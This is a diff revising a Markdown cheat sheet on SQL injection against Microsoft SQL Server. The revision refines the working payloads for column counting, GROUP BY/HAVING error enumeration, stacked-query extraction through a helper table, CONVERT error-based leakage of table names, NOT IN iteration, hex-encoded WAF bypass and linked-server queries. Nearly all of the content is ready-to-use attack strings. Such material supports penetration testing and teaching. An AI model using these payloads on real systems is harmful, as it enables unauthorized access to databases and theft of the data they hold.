@@ -4,7 +4,7 @@ description: How to discover and extract table and column information in MSSQL
 category: Information Gathering
 order: 7
 tags: ["tables", "columns", "schema discovery"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Discovering table and column information is a crucial step in SQL injection attacks against Microsoft SQL Server. This knowledge allows for targeted data extraction and more advanced exploitation.
@@ -16,11 +16,11 @@ Before extracting table information, you need to determine the number of columns
 ### Using ORDER BY
 
 ```sql
--- Incrementally increase the number until you get an error
-ORDER BY 1-- (Valid)
-ORDER BY 2-- (Valid)
-ORDER BY 3-- (Valid)
-ORDER BY n-- (Error when n is greater than the number of columns)
+-- String context: increase the number until you get an error
+' ORDER BY 1-- (Valid)
+' ORDER BY 2-- (Valid)
+' ORDER BY 3-- (Valid)
+' ORDER BY 4-- Error 108: "The ORDER BY position number 4 is out of range" (3 columns)
 ```
 
 ### Using UNION SELECT NULL
@@ -32,29 +32,21 @@ ORDER BY n-- (Error when n is greater than the number of columns)
 ' UNION SELECT NULL,NULL,NULL-- -- Works if query has exactly 3 columns
 ```
 
-### Using ERROR Messages
+### Using GROUP BY/HAVING Error Messages
 
-```sql
--- Using HAVING clause to extract column count
-HAVING 1=1--           -- Error message can indicate column count
-```
-
-### Using GROUP BY/HAVING Method
-
-This technique incrementally discovers column names through error messages:
+When errors are displayed, `HAVING` without a matching `GROUP BY` raises error 8120 naming the next selected column (as `table.column`). Add each revealed column to the `GROUP BY` list and repeat; the column count is the number of columns found once the error stops (string context, query `SELECT id, username, password, ... FROM users`):
 
 ```sql
 1' HAVING 1=1--
--- Error reveals first column name
+-- Column 'users.id' is invalid in the select list because it is not contained in ...
 
-1' GROUP BY username HAVING 1=1--
--- Error reveals second column name
+1' GROUP BY users.id HAVING 1=1--
+-- Column 'users.username' is invalid in the select list ...
 
-1' GROUP BY username, password HAVING 1=1--
--- Error reveals third column name (if exists)
+1' GROUP BY users.id, users.username HAVING 1=1--
+-- Column 'users.password' is invalid in the select list ...
 
-1' GROUP BY username, password, permission HAVING 1=1--
--- Continue until no more errors
+-- Continue until the query runs without error
 ```
 
 ## Information Schema Views
@@ -97,7 +89,7 @@ SQL Server's system catalog views provide more detailed metadata:
 -- List user tables using sys.tables
 SELECT name, create_date FROM sys.tables ORDER BY name
 
--- Using sys.objects (works in older versions too)
+-- Using sys.objects (SQL Server 2005+; type 'U' = user table)
 SELECT name FROM sys.objects WHERE type = 'U' ORDER BY name
 ```
 
@@ -117,7 +109,9 @@ WHERE o.type = 'U'
 ORDER BY o.name, c.column_id
 ```
 
-## Legacy System Tables (SQL Server 2000 and earlier)
+## Compatibility Views (sysobjects, syscolumns)
+
+The SQL Server 2000 system tables `sysobjects` and `syscolumns` are still available as compatibility views (deprecated, "will be removed in a future version"), so these queries still work on SQL Server 2017 through 2022:
 
 ```sql
 -- List user tables
@@ -147,32 +141,36 @@ SELECT STUFF((
 ), 1, 1, '')
 ```
 
-## Legacy Bulk Extraction (Temporary Tables)
+## Bulk Extraction Through a Helper Table
 
-For older versions or when XML functions are unavailable, you can use a temporary table to iterate through data:
-
-**How the iteration works:**
-
-- `@xy=':'` - Initializes with colon because `:` sorts before all letters in ASCII, ensuring the first table name will be greater than `@xy`
-- `name>@xy` - On each iteration, only selects names alphabetically after the current `@xy` value; as `@xy` accumulates names, this condition advances through the result set
-- `SUBSTRING(xy,1,353)` - Limits output to 353 characters because error messages in MSSQL are typically truncated around this length; for longer results, use `SUBSTRING(xy,354,353)` to get the next chunk
+On SQL Server 2000, which has neither `STRING_AGG` nor `FOR XML PATH`, the classic approach concatenates all names into a variable with `SELECT @xy=@xy+...`, stores the result in a table, and reads it back with an error-based request. The `SELECT ... INTO` creates a regular table, so it persists between requests until dropped (numeric context):
 
 ```sql
--- 1. Create temp table and insert data
-AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;
+-- 1. Concatenate all user table names into a new table
+1 AND 1=0; DECLARE @xy varchar(8000) SET @xy='' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' SELECT @xy AS xy INTO TMP_DB--
 
--- 2. Dump content (first 353 chars; use SUBSTRING(xy,354,353) for next chunk)
-AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+-- 2. Read it through a conversion error (first chunk; then SUBSTRING(xy,1501,1500), ...)
+1 AND 1=(SELECT TOP 1 SUBSTRING(xy,1,1500) FROM TMP_DB)--
 
 -- 3. Cleanup
-AND 1=0; DROP TABLE TMP_DB;
+1 AND 1=0; DROP TABLE TMP_DB--
 ```
 
-**Important:** This technique requires stacked queries (multiple statements separated by `;`) and a persistent connection where the temporary table survives between requests. It does not work with simple UNION-based injection or environments where each query runs in isolation.
+**Important:** This requires stacked queries and permission to create tables in the current database (`CREATE TABLE`, e.g. `db_owner` or `db_ddladmin`). A conversion error message shows the first 1,991 characters of the value (the message is capped at 2,047; same on 2017, 2019 and 2022), and values longer than `nvarchar(4000)` or `varchar(8000)` fail with "String or binary data would be truncated" instead of leaking; applications may also show less, hence the chunks. On SQL Server 2005 and later the same result is available in one request without a helper table:
+
+```sql
+1 AND 1=CONVERT(int,(SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')))--
+
+-- The list is nvarchar(max): past 4,000 characters it leaks nothing, so read it in chunks
+1 AND 1=CONVERT(int,SUBSTRING((SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')),1,1500))--
+1 AND 1=CONVERT(int,SUBSTRING((SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')),1501,1500))--
+```
 
 ## Practical Injection Examples
 
 ### UNION Attack for Tables
+
+These assume a string injection point in a 3-column query whose second column is displayed and is a string:
 
 ```sql
 -- Basic UNION attack to get table names
@@ -197,17 +195,19 @@ AND 1=0; DROP TABLE TMP_DB;
 ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--
 ```
 
+Comparing a string to the integer `1` forces a conversion, and the error message contains the value (`Conversion failed when converting the nvarchar value 'users' to data type int`).
+
 **Iterative NOT IN extraction:** Run the first query to get result A, then add A to the `NOT IN()` list to get result B, then `NOT IN('A','B')` to get C, and so on until no new results are returned.
 
 ```sql
 -- First iteration: get first table (e.g., returns 'users')
 ' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
 
--- Second iteration: exclude 'users' to get next table (e.g., 'orders')
+-- Second iteration: exclude 'users' to get next table (e.g., 'products')
 ' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users'))--
 
--- Third iteration: exclude both to get next (e.g., 'products')
-' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users','orders'))--
+-- Third iteration: exclude both to get next (e.g., 'articles')
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users','products'))--
 
 -- Same pattern for columns
 ' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns)--
@@ -225,7 +225,7 @@ Hex encoding can bypass simple keyword-based WAFs that block strings like `SELEC
 -- 0x53454c454354202a2046524f4d207573657273 = 'SELECT * FROM users'
 ```
 
-**Note:** This requires stacked queries support. The hex string itself passes through the WAF undetected, but `DECLARE`, `CAST`, and `EXEC` keywords may still be blocked by more sophisticated filters.
+**Note:** This requires stacked queries support, and the `SELECT` output arrives as a second result set that many applications never display, so it is mostly useful for statements with side effects. The hex string itself passes through the WAF undetected, but `DECLARE`, `CAST`, and `EXEC` keywords may still be blocked by more sophisticated filters.
 
 ### Blind Extraction
 
@@ -237,7 +237,7 @@ Hex encoding can bypass simple keyword-based WAFs that block strings like `SELEC
 
 ## Database Link Traversal
 
-For linked servers, you can query tables across servers:
+For linked servers (listed in `sys.servers`), you can query tables across servers with four-part names. The remote query runs with the linked server's login mapping:
 
 ```sql
 -- Query tables on linked server
